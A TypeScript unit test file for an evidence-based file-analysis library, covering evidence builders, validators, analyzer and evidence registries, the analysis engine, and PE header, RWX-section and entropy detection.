/**
 * Comprehensive tests for @veris/analysis.
 *
 * Tests cover:
 * - Core types and helpers
 * - EvidenceBuilder
 * - EvidenceValidator
 * - BaseAnalyzer
 * - AnalyzerRegistry (registration, priority, matching, parallel execution)
 * - EvidenceRegistry (add, query, stats)
 * - AnalysisEngine
 * - All 14 built-in analyzers
 * - Cancellation and timeouts
 * - Determinism
 * - Immutability
 * - Concurrency
 */

import { describe, it, expect, vi } from 'vitest';
import { deterministicId } from '@veris/shared';
import type { Artifact, SourceLocation } from '@veris/core';

// Import analysis package
import {
  // Types
  Evidence,
  EvidenceCategory,
  AnalysisContext,
  Analyzer,
  AnalysisResult,
  AnalyzerRunDiagnostics,
  RegistryAnalysisDiagnostics,
  AnalysisIssue,
  AnalysisError,
  createEvidence,
  createSkippedDiagnostics,
  createAnalysisIssue,
  noIssues,

  // Builder
  EvidenceBuilder,

  // Validator
  ValidationError,
  validateEvidence,
  validateEvidenceBatch,
  ValidationErrorCodes,

  // Base
  BaseAnalyzer,
  BaseAnalyzerOptions,

  // Registry
  AnalyzerRegistry,
  RegistryAnalysisResult,

  // Evidence Registry
  EvidenceRegistry,
  EvidenceQuery,
  EvidenceQueryResult,
  EvidenceRegistryStats,

  // Diagnostics
  DefaultDiagnosticsCollector,

  // Engine
  AnalysisEngine,
  AnalysisEngineConfig,
  ArtifactAnalysisResult,
  BatchAnalysisResult,

  // Feature reference
  FeatureReference,

  // Built-in analyzers
  PEAnalyzer,
  ELFAnalyzer,
  MachOAnalyzer,
  CertificateAnalyzer,
  DocumentAnalyzer,
  OfficeAnalyzer,
  ArchiveAnalyzer,
  EntropyAnalyzer,
  ImportAnalyzer,
  StringAnalyzer,
  PersistenceAnalyzer,
  ScriptAnalyzer,
  ContainerAnalyzer,
  DependencyAnalyzer,
} from '../src/index.js';

// ─── Helpers ────────────────────────────────────────────────────

/** Create a minimal artifact for testing. */
function createTestArtifact(overrides: Partial<Artifact> = {}): Artifact {
  return {
    id: overrides.id ?? 'art_test123',
    sessionId: 'ss_test456',
    parentId: null,
    type: overrides.type ?? 'file',
    normalizedPath: '/test/file.txt',
    size: overrides.size ?? 0,
    contentHash: { algorithm: 'sha-256', value: 'abc123' },
    mimeType: 'text/plain',
    extractedAt: new Date().toISOString(),
    extractorId: 'test',
    ...overrides,
  };
}

/** Create a feature reference for testing. */
function createFeatureRef(overrides: Partial<FeatureReference> = {}): FeatureReference {
  return {
    id: overrides.id ?? 'feat_test',
    type: overrides.type ?? 'test-type',
    value: overrides.value ?? 'test',
    confidence: overrides.confidence ?? 1.0,
    location: overrides.location,
    metadata: overrides.metadata,
  };
}

/** Create a minimal SourceLocation for testing. */
function createLocation(overrides: Partial<SourceLocation> = {}): SourceLocation {
  return {
    startLine: 1,
    startColumn: 0,
    endLine: 1,
    endColumn: 5,
    offset: 0,
    length: 5,
    ...overrides,
  };
}

/** Create a simple test analyzer. */
function createTestAnalyzer(
  id: string,
  priority: number = 500,
  types: readonly string[] = ['file'],
  evidenceType: string = 'test-evidence',
  evidenceValue: unknown = 'value',
): BaseAnalyzer {
  return new (class extends BaseAnalyzer {
    constructor() {
      super({ id, name: id, version: '1.0.0', supportedArtifactTypes: types, priority });
    }

    async analyze(context: AnalysisContext): Promise<AnalysisResult> {
      const evidence = this.makeEvidence(
        context.artifact.id,
        'metadata',
        evidenceType,
        'Test evidence description',
        { confidence: 1.0 },
      );
      return this.ok([evidence]);
    }
  })();
}

/** Create a minimal analysis context for testing. */
function createTestContext(
  features: FeatureReference[] = [],
  overrides: Partial<AnalysisContext> = {},
): AnalysisContext {
  const artifact = createTestArtifact({
    ...(overrides.artifact ? { type: overrides.artifact.type } : {}),
  });
  return {
    artifact,
    sessionId: 'ss_test456',
    content: null,
    features,
    ...overrides,
  };
}

// ─── Core Types ─────────────────────────────────────────────────

describe('Core Types', () => {
  it('createEvidence creates frozen evidence', () => {
    const e = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'pe-format',
      confidence: 1.0,
      explanation: 'PE format detected',
      analyzerId: 'pe-analyzer',
    });
    expect(e.id).toBe('ev_test');
    expect(e.artifactId).toBe('art_123');
    expect(e.category).toBe('executable');
    expect(e.type).toBe('pe-format');
    expect(e.confidence).toBe(1.0);
    expect(e.explanation).toBe('PE format detected');
    expect(e.analyzerId).toBe('pe-analyzer');
    expect(Object.isFrozen(e)).toBe(true);
    expect(Object.isFrozen(e.featureIds)).toBe(true);
    expect(Object.isFrozen(e.locations)).toBe(true);
    expect(Object.isFrozen(e.metadata)).toBe(true);
  });

  it('createEvidence with optional fields', () => {
    const loc = createLocation();
    const e = createEvidence({
      id: 'ev_test2',
      artifactId: 'art_123',
      category: 'network',
      type: 'embedded-url',
      confidence: 0.8,
      explanation: 'URL found',
      featureIds: ['feat_1', 'feat_2'],
      locations: [loc],
      metadata: { url: 'http://example.com' },
      analyzerId: 'string-analyzer',
    });
    expect(e.featureIds).toEqual(['feat_1', 'feat_2']);
    expect(e.locations).toEqual([loc]);
    expect(e.metadata?.url).toBe('http://example.com');
  });

  it('createSkippedDiagnostics creates proper diagnostics', () => {
    const d = createSkippedDiagnostics('an1', 'test skip');
    expect(d.analyzerId).toBe('an1');
    expect(d.skipped).toBe(true);
    expect(d.skipReason).toBe('test skip');
    expect(d.evidenceEmitted).toBe(0);
  });

  it('createAnalysisIssue creates proper issue', () => {
    const i = createAnalysisIssue('an1', 'ERR_001', 'error message', true);
    expect(i.analyzerId).toBe('an1');
    expect(i.code).toBe('ERR_001');
    expect(i.isError).toBe(true);
    expect(Object.isFrozen(i)).toBe(true);
  });

  it('noIssues returns empty frozen array', () => {
    expect(noIssues()).toEqual([]);
    expect(Object.isFrozen(noIssues())).toBe(true);
  });

  it('AnalysisError is properly formed', () => {
    const err = new AnalysisError('fail', 'ERR', 'an1');
    expect(err.message).toBe('fail');
    expect(err.code).toBe('ERR');
    expect(err.analyzerId).toBe('an1');
    expect(err.name).toBe('AnalysisError');
  });
});

// ─── EvidenceBuilder ───────────────────────────────────────────

describe('EvidenceBuilder', () => {
  it('builds evidence with all required fields', () => {
    const evidence = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('executable')
      .withType('pe-import')
      .withExplanation('Import table contains CreateRemoteThread from kernel32.dll')
      .withConfidence(1.0)
      .withAnalyzerId('pe-analyzer')
      .build();

    expect(evidence.artifactId).toBe('art_123');
    expect(evidence.category).toBe('executable');
    expect(evidence.type).toBe('pe-import');
    expect(evidence.explanation).toBe('Import table contains CreateRemoteThread from kernel32.dll');
    expect(evidence.confidence).toBe(1.0);
    expect(evidence.analyzerId).toBe('pe-analyzer');
    expect(evidence.id.startsWith('ev_')).toBe(true);
    expect(Object.isFrozen(evidence)).toBe(true);
  });

  it('builds evidence with optional fields', () => {
    const loc = createLocation();
    const evidence = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('obfuscation')
      .withType('high-entropy')
      .withExplanation('High entropy detected')
      .withConfidence(0.8)
      .withAnalyzerId('entropy-analyzer')
      .withFeatureIds(['feat_1', 'feat_2'])
      .addFeatureId('feat_3')
      .withLocations([loc])
      .addLocation(createLocation({ startLine: 5 }))
      .withMetadata({ entropy: 7.5 })
      .build();

    expect(evidence.featureIds).toEqual(['feat_1', 'feat_2', 'feat_3']);
    expect(evidence.locations.length).toBe(2);
    expect(evidence.metadata?.entropy).toBe(7.5);
  });

  it('produces deterministic IDs for same input', () => {
    const b1 = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('executable')
      .withType('pe-format')
      .withExplanation('PE detected')
      .withConfidence(1.0)
      .withAnalyzerId('pe-analyzer')
      .build();

    const b2 = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('executable')
      .withType('pe-format')
      .withExplanation('PE detected')
      .withConfidence(1.0)
      .withAnalyzerId('pe-analyzer')
      .build();

    expect(b1.id).toBe(b2.id);
  });

  it('throws for missing required fields', () => {
    expect(() => new EvidenceBuilder().build()).toThrow('missing required fields');
  });

  it('throws for invalid confidence', () => {
    expect(() =>
      new EvidenceBuilder()
        .withArtifactId('art_123')
        .withCategory('executable')
        .withType('test')
        .withExplanation('test')
        .withConfidence(1.5)
        .withAnalyzerId('test')
        .build(),
    ).toThrow('confidence must be in [0.0, 1.0]');
  });

  it('can reset and reuse', () => {
    const builder = new EvidenceBuilder();
    builder
      .withArtifactId('art_1')
      .withCategory('executable')
      .withType('a')
      .withExplanation('a')
      .withConfidence(1.0)
      .withAnalyzerId('a')
      .build();

    builder.reset();
    builder
      .withArtifactId('art_2')
      .withCategory('network')
      .withType('b')
      .withExplanation('b')
      .withConfidence(0.5)
      .withAnalyzerId('b')
      .build();

    // Should not throw
    expect(true).toBe(true);
  });
});

// ─── EvidenceValidator ─────────────────────────────────────────

describe('EvidenceValidator', () => {
  it('validates a valid evidence', () => {
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'pe-format',
      confidence: 1.0,
      explanation: 'PE format detected',
      analyzerId: 'pe-analyzer',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value).toBe(evidence);
    }
  });

  it('rejects evidence with missing id', () => {
    const evidence = createEvidence({
      id: '',
      artifactId: 'art_123',
      category: 'executable',
      type: 'pe-format',
      confidence: 1.0,
      explanation: 'test',
      analyzerId: 'test',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.some((e) => e.code === 'MISSING_ID')).toBe(true);
    }
  });

  it('rejects evidence with invalid id format', () => {
    const evidence = createEvidence({
      id: 'bad_prefix',
      artifactId: 'art_123',
      category: 'executable',
      type: 'test',
      confidence: 1.0,
      explanation: 'test',
      analyzerId: 'test',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.some((e) => e.code === 'INVALID_ID_FORMAT')).toBe(true);
    }
  });

  it('rejects evidence with missing artifactId', () => {
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: '',
      category: 'executable',
      type: 'test',
      confidence: 1.0,
      explanation: 'test',
      analyzerId: 'test',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
  });

  it('rejects evidence with invalid confidence', () => {
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'test',
      confidence: 1.5,
      explanation: 'test',
      analyzerId: 'test',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
  });

  it('rejects evidence with empty explanation', () => {
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'test',
      confidence: 1.0,
      explanation: '   ',
      analyzerId: 'test',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
  });

  it('rejects evidence with missing analyzerId', () => {
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'test',
      confidence: 1.0,
      explanation: 'test',
      analyzerId: '',
    });
    const result = validateEvidence(evidence);
    expect(result.ok).toBe(false);
  });

  it('validates batch of all valid evidence', () => {
    const list = [
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 0.5,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ];
    const result = validateEvidenceBatch(list);
    expect(result.ok).toBe(true);
  });

  it('returns errors for batch with invalid evidence', () => {
    const list = [
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: '',
        artifactId: '',
        category: 'executable',
        type: '',
        confidence: 1.0,
        explanation: '',
        analyzerId: '',
      }),
    ];
    const result = validateEvidenceBatch(list);
    expect(result.ok).toBe(false);
  });
});

// ─── BaseAnalyzer ──────────────────────────────────────────────

describe('BaseAnalyzer', () => {
  it('canAnalyze defaults to type matching', () => {
    const a = createTestAnalyzer('test', 500, ['file']);
    const ctx = createTestContext();
    expect(a.canAnalyze(ctx)).toBe(true);
  });

  it('canAnalyze returns false for non-matching types', () => {
    const a = createTestAnalyzer('test', 500, ['executable']);
    const ctx = createTestContext();
    expect(a.canAnalyze(ctx)).toBe(false);
  });

  it('canAnalyze returns true if no supported types', () => {
    const a = createTestAnalyzer('test', 500, []);
    const ctx = createTestContext();
    expect(a.canAnalyze(ctx)).toBe(true);
  });

  it('analyze returns proper result with evidence', async () => {
    const a = createTestAnalyzer('my-an', 500, ['file'], 'my-type');
    const ctx = createTestContext();
    const result = await a.analyze(ctx);
    expect(result.evidence.length).toBe(1);
    expect(result.evidence[0].type).toBe('my-type');
    expect(result.evidence[0].analyzerId).toBe('my-an');
    expect(Object.isFrozen(result.evidence)).toBe(true);
    expect(Object.isFrozen(result.diagnostics)).toBe(true);
  });

  it('makeEvidence creates proper evidence with artifactId', () => {
    const a = createTestAnalyzer('make-ev-test');
    const ctx = createTestContext();
    const ev = a['makeEvidence']('art_123', 'executable', 'test-type', 'test explanation', {
      confidence: 0.8,
    });
    expect(ev.artifactId).toBe('art_123');
    expect(ev.type).toBe('test-type');
    expect(ev.explanation).toBe('test explanation');
    expect(ev.confidence).toBe(0.8);
    expect(ev.analyzerId).toBe('make-ev-test');
    expect(ev.id.startsWith('ev_')).toBe(true);
    expect(Object.isFrozen(ev)).toBe(true);
  });

  it('ok() creates proper AnalysisResult', () => {
    const a = createTestAnalyzer('ok-test');
    const evidence = createEvidence({
      id: 'ev_test',
      artifactId: 'art_123',
      category: 'executable',
      type: 'test',
      confidence: 1.0,
      explanation: 'test',
      analyzerId: 'ok-test',
    });
    const result = a['ok']([evidence], { startTime: 0, endTime: 100 });
    expect(result.evidence.length).toBe(1);
    expect(result.diagnostics.evidenceEmitted).toBe(1);
    expect(result.diagnostics.durationMs).toBe(100);
  });
});

// ─── AnalyzerRegistry ──────────────────────────────────────────

describe('AnalyzerRegistry', () => {
  it('register adds analyzer', () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('an1'));
    expect(reg.size).toBe(1);
  });

  it('register throws on duplicate id', () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('an1'));
    expect(() => reg.register(createTestAnalyzer('an1'))).toThrow('already registered');
  });

  it('registerAll adds multiple analyzers', () => {
    const reg = new AnalyzerRegistry();
    reg.registerAll([createTestAnalyzer('a'), createTestAnalyzer('b')]);
    expect(reg.size).toBe(2);
  });

  it('unregister removes analyzer', () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('an1'));
    expect(reg.unregister('an1')).toBe(true);
    expect(reg.size).toBe(0);
  });

  it('unregister returns false for unknown id', () => {
    const reg = new AnalyzerRegistry();
    expect(reg.unregister('unknown')).toBe(false);
  });

  it('getAnalyzer returns analyzer by id', () => {
    const reg = new AnalyzerRegistry();
    const a = createTestAnalyzer('an1');
    reg.register(a);
    expect(reg.getAnalyzer('an1')).toBe(a);
    expect(reg.getAnalyzer('unknown')).toBeUndefined();
  });

  it('getAnalyzers returns sorted by priority', () => {
    const reg = new AnalyzerRegistry();
    const a = createTestAnalyzer('a', 200);
    const b = createTestAnalyzer('b', 100);
    const c = createTestAnalyzer('c', 300);
    reg.registerAll([a, b, c]);
    const sorted = reg.getAnalyzers();
    expect(sorted[0].id).toBe('b');
    expect(sorted[1].id).toBe('a');
    expect(sorted[2].id).toBe('c');
  });

  it('analyze runs applicable analyzers', async () => {
    const reg = new AnalyzerRegistry();
    reg.registerAll([
      createTestAnalyzer('an1', 100, ['file'], 'type1'),
      createTestAnalyzer('an2', 200, ['executable'], 'type2'),
    ]);
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(result.evidence.length).toBe(1);
    expect(result.evidence[0].type).toBe('type1');
    expect(result.diagnostics.matchedAnalyzers).toBe(1);
    expect(result.diagnostics.skippedAnalyzers.length).toBe(1);
  });

  it('analyze respects sequential option', async () => {
    const reg = new AnalyzerRegistry();
    const order: string[] = [];
    const a1 = new (class extends BaseAnalyzer {
      constructor() {
        super({
          id: 'first',
          name: 'First',
          version: '1.0.0',
          supportedArtifactTypes: ['file'],
          priority: 100,
        });
      }
      async analyze(ctx: AnalysisContext): Promise<AnalysisResult> {
        order.push('first');
        return this.ok([]);
      }
    })();
    const a2 = new (class extends BaseAnalyzer {
      constructor() {
        super({
          id: 'second',
          name: 'Second',
          version: '1.0.0',
          supportedArtifactTypes: ['file'],
          priority: 200,
        });
      }
      async analyze(ctx: AnalysisContext): Promise<AnalysisResult> {
        order.push('second');
        return this.ok([]);
      }
    })();
    reg.registerAll([a1, a2]);
    const ctx = createTestContext();
    await reg.analyze(ctx, { sequential: true });
    expect(order).toEqual(['first', 'second']);
  });

  it('analyze collects diagnostics', async () => {
    const reg = new AnalyzerRegistry();
    reg.registerAll([
      createTestAnalyzer('an1', 100, ['file'], 't1'),
      createTestAnalyzer('an2', 200, ['file'], 't2'),
    ]);
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(result.diagnostics.totalAnalyzers).toBe(2);
    expect(result.diagnostics.matchedAnalyzers).toBe(2);
    expect(result.diagnostics.totalEvidenceEmitted).toBe(2);
    expect(result.durationMs).toBeGreaterThanOrEqual(0);
  });

  it('handles no matching analyzers', async () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('a1', 100, ['executable']));
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(result.evidence.length).toBe(0);
    expect(result.diagnostics.matchedAnalyzers).toBe(0);
  });

  it('handles empty registry', async () => {
    const reg = new AnalyzerRegistry();
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(result.evidence.length).toBe(0);
    expect(result.cancelled).toBe(false);
  });

  it('analyzer errors are caught and reported', async () => {
    const reg = new AnalyzerRegistry();
    const failingAn = new (class extends BaseAnalyzer {
      constructor() {
        super({
          id: 'fail',
          name: 'Failing',
          version: '1.0.0',
          supportedArtifactTypes: ['file'],
          priority: 100,
        });
      }
      async analyze(ctx: AnalysisContext): Promise<AnalysisResult> {
        throw new AnalysisError('something broke', 'ERR_999');
      }
    })();
    reg.register(failingAn);
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(result.evidence.length).toBe(0);
    expect(result.diagnostics.errors.length).toBe(1);
    expect(result.diagnostics.errors[0].code).toBe('ERR_999');
  });

  it('supports cancellation via CancellationToken', async () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('slow-an', 100, ['file'], 't'));
    const { CancellationTokenSource } = await import('@veris/shared');
    const cts = new CancellationTokenSource();
    cts.cancel('cancelled for test');
    const ctx = createTestContext([], { cancellationToken: cts.token });
    const result = await reg.analyze(ctx);
    expect(result.cancelled).toBe(true);
    expect(result.cancelReason).toBe('cancelled for test');
  });

  it('timeout kills long-running analyzers', async () => {
    const reg = new AnalyzerRegistry();
    const slowAn = new (class extends BaseAnalyzer {
      constructor() {
        super({
          id: 'slow',
          name: 'Slow',
          version: '1.0.0',
          supportedArtifactTypes: ['file'],
          priority: 100,
        });
      }
      async analyze(ctx: AnalysisContext): Promise<AnalysisResult> {
        await new Promise((r) => setTimeout(r, 5000));
        return this.ok([]);
      }
    })();
    reg.register(slowAn);
    const ctx = createTestContext();
    const result = await reg.analyze(ctx, { timeoutMs: 50 });
    expect(result.diagnostics.errors.length).toBe(1);
    expect(result.diagnostics.errors[0].code).toBe('TIMEOUT');
  });
});

// ─── EvidenceRegistry ──────────────────────────────────────────

describe('EvidenceRegistry', () => {
  it('adds and retrieves evidence', () => {
    const reg = new EvidenceRegistry();
    const ev = createEvidence({
      id: 'ev_1',
      artifactId: 'a',
      category: 'executable',
      type: 't1',
      confidence: 1.0,
      explanation: 'e1',
      analyzerId: 'a1',
    });
    reg.add(ev);
    expect(reg.size).toBe(1);
    expect(reg.getAll().length).toBe(1);
  });

  it('addAll adds multiple', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 0.5,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ]);
    expect(reg.size).toBe(2);
  });

  it('queries by category', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 0.5,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ]);
    const result = reg.query({ category: 'executable' });
    expect(result.total).toBe(1);
    expect(result.evidence[0].id).toBe('ev_1');
  });

  it('queries by artifactId', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'art_a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'art_b',
        category: 'network',
        type: 't2',
        confidence: 0.5,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ]);
    const result = reg.query({ artifactId: 'art_a' });
    expect(result.total).toBe(1);
  });

  it('queries by min confidence', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 0.3,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 0.8,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ]);
    const result = reg.query({ minConfidence: 0.5 });
    expect(result.total).toBe(1);
    expect(result.evidence[0].id).toBe('ev_2');
  });

  it('queries with limit', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 1.0,
        explanation: 'e2',
        analyzerId: 'a2',
      }),
    ]);
    const result = reg.query({ limit: 1 });
    expect(result.evidence.length).toBe(1);
    expect(result.total).toBe(2);
  });

  it('getStats returns correct stats', () => {
    const reg = new EvidenceRegistry();
    reg.addAll([
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'pe-analyzer',
      }),
      createEvidence({
        id: 'ev_2',
        artifactId: 'b',
        category: 'network',
        type: 't2',
        confidence: 0.5,
        explanation: 'e2',
        analyzerId: 'string-analyzer',
      }),
    ]);
    const stats = reg.getStats();
    expect(stats.totalEvidence).toBe(2);
    expect(stats.categories.executable).toBe(1);
    expect(stats.categories.network).toBe(1);
  });

  it('clear removes all evidence', () => {
    const reg = new EvidenceRegistry();
    reg.add(
      createEvidence({
        id: 'ev_1',
        artifactId: 'a',
        category: 'executable',
        type: 't1',
        confidence: 1.0,
        explanation: 'e1',
        analyzerId: 'a1',
      }),
    );
    reg.clear();
    expect(reg.size).toBe(0);
  });
});

// ─── DefaultDiagnosticsCollector ───────────────────────────────

describe('DefaultDiagnosticsCollector', () => {
  it('records start and end', () => {
    const diag = new DefaultDiagnosticsCollector();
    diag.recordStart('an1', 1000);
    diag.recordEnd('an1', 2000);
    const d = diag.getAnalyzerDiagnostics('an1')!;
    expect(d.startTime).toBe(1000);
    expect(d.endTime).toBe(2000);
    expect(d.durationMs).toBe(1000);
  });

  it('records evidence emitted', () => {
    const diag = new DefaultDiagnosticsCollector();
    diag.recordStart('an1', 0);
    diag.recordEvidenceEmitted('an1', 10);
    diag.recordEnd('an1', 100);
    const d = diag.getAnalyzerDiagnostics('an1')!;
    expect(d.evidenceEmitted).toBe(10);
  });

  it('records issues', () => {
    const diag = new DefaultDiagnosticsCollector();
    diag.recordIssue('an1', 'WARN', 'warning', false);
    diag.recordIssue('an1', 'ERR', 'error', true);
    const d = diag.getAnalyzerDiagnostics('an1')!;
    expect(d.issues.length).toBe(2);
  });

  it('records skipped', () => {
    const diag = new DefaultDiagnosticsCollector();
    diag.recordSkipped('an1', 'not applicable');
    const d = diag.getAnalyzerDiagnostics('an1')!;
    expect(d.skipped).toBe(true);
    expect(d.skipReason).toBe('not applicable');
  });

  it('buildRegistryDiagnostics aggregates correctly', () => {
    const diag = new DefaultDiagnosticsCollector();
    diag.recordStart('a', 0);
    diag.recordEnd('a', 100);
    diag.recordEvidenceEmitted('a', 5);
    diag.recordSkipped('b', 'skip reason');
    diag.recordIssue('a', 'W1', 'warning', false);
    diag.recordIssue('a', 'E1', 'error', true);

    const rd = diag.buildRegistryDiagnostics();
    expect(rd.totalAnalyzers).toBe(2);
    expect(rd.matchedAnalyzers).toBe(1);
    expect(rd.skippedAnalyzers.length).toBe(1);
    expect(rd.warnings.length).toBe(1);
    expect(rd.errors.length).toBe(1);
    expect(rd.totalEvidenceEmitted).toBe(5);
  });
});

// ─── AnalysisEngine ────────────────────────────────────────────

describe('AnalysisEngine', () => {
  it('creates engine with analyzers', () => {
    const engine = new AnalysisEngine({
      analyzers: [createTestAnalyzer('test-an')],
    });
    expect(engine.getRegistry().size).toBe(1);
  });

  it('analyzeArtifact produces evidence', async () => {
    const engine = new AnalysisEngine({
      analyzers: [createTestAnalyzer('test-an', 100, ['file'], 'my-type')],
    });
    const artifact = createTestArtifact({ type: 'file' });
    const result = await engine.analyzeArtifact(artifact, 'ss_test', []);
    expect(result.artifactId).toBe(artifact.id);
    expect(result.evidence.length).toBe(1);
    expect(result.evidence[0].type).toBe('my-type');
  });

  it('analyzeArtifact stores evidence in registry', async () => {
    const engine = new AnalysisEngine({
      analyzers: [createTestAnalyzer('test-an')],
    });
    const artifact = createTestArtifact({ type: 'file' });
    await engine.analyzeArtifact(artifact, 'ss_test', []);
    expect(engine.getEvidenceRegistry().size).toBe(1);
  });

  it('analyzeBatch processes multiple artifacts', async () => {
    const engine = new AnalysisEngine({
      analyzers: [createTestAnalyzer('test-an')],
    });
    const results = await engine.analyzeBatch([
      {
        artifact: createTestArtifact({ id: 'art_1', type: 'file' }),
        sessionId: 'ss1',
        features: [],
      },
      {
        artifact: createTestArtifact({ id: 'art_2', type: 'file' }),
        sessionId: 'ss2',
        features: [],
      },
    ]);
    expect(results.results.length).toBe(2);
    expect(results.allEvidence.length).toBe(2);
    expect(results.diagnostics.totalArtifacts).toBe(2);
  });

  it('clear empties evidence', async () => {
    const engine = new AnalysisEngine({
      analyzers: [createTestAnalyzer('test-an')],
    });
    const artifact = createTestArtifact({ type: 'file' });
    await engine.analyzeArtifact(artifact, 'ss_test', []);
    engine.clear();
    expect(engine.getEvidenceRegistry().size).toBe(0);
  });
});

// ─── Built-in Analyzers: PEAnalyzer ────────────────────────────

describe('PEAnalyzer', () => {
  it('detects PE via features', () => {
    const an = new PEAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'pe-header' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('rejects non-PE artifacts', () => {
    const an = new PEAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'string-literal' })]);
    expect(an.canAnalyze(ctx)).toBe(false);
  });

  it('produces evidence for PE headers', async () => {
    const an = new PEAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'feat_pe_header',
          type: 'pe-header',
          value: {
            machine: 'I386',
            isPE32Plus: false,
            entryPoint: 0x1000,
            imageBase: 0x400000,
            numberOfSections: 3,
          },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.length).toBeGreaterThan(0);
    const peFormat = result.evidence.find((e) => e.type === 'pe-format');
    expect(peFormat).toBeDefined();
    expect(peFormat!.category).toBe('executable');
  });

  it('produces RWX section evidence', async () => {
    const an = new PEAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'feat_hdr',
          type: 'pe-header',
          value: {
            machine: 'I386',
            isPE32Plus: false,
            entryPoint: 0x1000,
            imageBase: 0x400000,
            numberOfSections: 1,
          },
        }),
        createFeatureRef({
          id: 'feat_sec',
          type: 'pe-section',
          value: { name: '.text', characteristics: 0xe0000020 },
          location: createLocation(),
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    const rwx = result.evidence.find((e) => e.type === 'pe-rwx-section');
    expect(rwx).toBeDefined();
    expect(rwx!.category).toBe('executable');
  });

  it('produces high entropy section evidence', async () => {
    const an = new PEAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'feat_hdr',
          type: 'pe-header',
          value: {
            machine: 'I386',
            isPE32Plus: false,
            entryPoint: 0x1000,
            imageBase: 0x400000,
            numberOfSections: 1,
          },
        }),
        createFeatureRef({
          id: 'feat_ent',
          type: 'section-entropy',
          value: 7.8,
          metadata: { section: '.text' },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    const highEntropy = result.evidence.find((e) => e.type === 'high-entropy-section');
    expect(highEntropy).toBeDefined();
  });
});

